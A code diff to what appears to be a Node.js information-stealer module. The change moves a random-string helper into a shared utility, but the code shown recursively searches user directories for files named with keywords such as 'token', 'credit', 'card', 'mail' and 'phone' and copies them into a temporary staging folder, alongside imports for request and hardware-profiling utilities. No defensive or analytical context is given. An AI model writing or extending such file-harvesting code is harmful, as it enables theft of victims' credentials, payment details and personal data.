@@ -5,6 +5,7 @@ const os = require('os');
 const requests = require('./../../utils/requests/requests.js');
 const fileutil = require('./../../utils/fileutil/fileutil.js');
 const hardware = require('./../../utils/hardware/hardware.js');
+const program = require('./../../utils/program/program.js');
 
 const keywords = [
     "compte", "token", "credit", "card", "mail", "address", "phone",
@@ -26,11 +27,6 @@ const isMatchingFile = (fileName) => {
         extensions.some(extension => lowerCaseName.endsWith(extension));
 };
 
-const randString = (length) => {
-    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
-};
-
 const searchFiles = async (dir, commonFilesTempDir, foundExtensions) => {
     try {
         const files = await fs.readdir(dir);
@@ -41,7 +37,7 @@ const searchFiles = async (dir, commonFilesTempDir, foundExtensions) => {
             if (info.isFile() && info.size <= 2 * 1024 * 1024 && isMatchingFile(file)) {
                 const userDir = path.join(commonFilesTempDir, path.basename(dir));
                 await fs.mkdir(userDir, { recursive: true });
-                const dest = path.join(userDir, `${randString(4)}_${file}`);
+                const dest = path.join(userDir, `${program.randString(5)}_${file}`);
 
                 await fileutil.copy(filePath, dest);
                 foundExtensions.add(path.extname(file).toLowerCase());
